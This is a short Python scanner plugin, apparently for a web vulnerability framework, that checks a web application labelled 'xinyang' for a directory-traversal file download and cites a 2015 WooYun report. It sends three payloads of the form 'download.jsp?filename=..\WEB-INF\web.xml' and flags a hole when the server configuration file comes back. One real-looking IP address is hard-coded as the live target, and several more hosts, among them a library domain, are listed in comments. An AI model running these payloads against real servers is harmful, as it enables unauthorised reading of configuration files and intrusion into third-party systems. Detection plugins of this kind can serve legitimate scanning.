#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0134085

import re

def assign(service, arg):
    if service == "xinyang":
        return True, arg
        
        
def audit(arg): 
    payloads= [
        'module/download.jsp?filename=..\WEB-INF\web.xml',
        'module/exceldown.jsp?filename=..\WEB-INF\web.xml',
        'module/exceldownload.jsp?filename=..\WEB-INF\web.xml'
        ]
    for payload in payloads:
        code, head, res, errcode, _ = curl.curl2(arg+payload)
        if code == 200 and ' <servlet-mapping>' in res  and 'web-app version' in res:
            security_hole(arg + payload + "   :file download")
        
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('xinyang','http://60.171.185.69:8089/')[1])
    # audit(assign('xinyang','http://59.51.114.198:8088/')[1])
    # audit(assign('xinyang','http://www.kflib.cn:8090/')[1])
    # audit(assign('xinyang','http://125.223.252.12:8089/')[1])
    # audit(assign('xinyang','http://218.75.178.63:8089/')[1])
    # audit(assign('xinyang','http://58.133.216.9:8070/')[1])
    # audit(assign('xinyang','http://210.45.183.219/')[1])
    # audit(assign('xinyang','http://211.86.195.15:8086/')[1])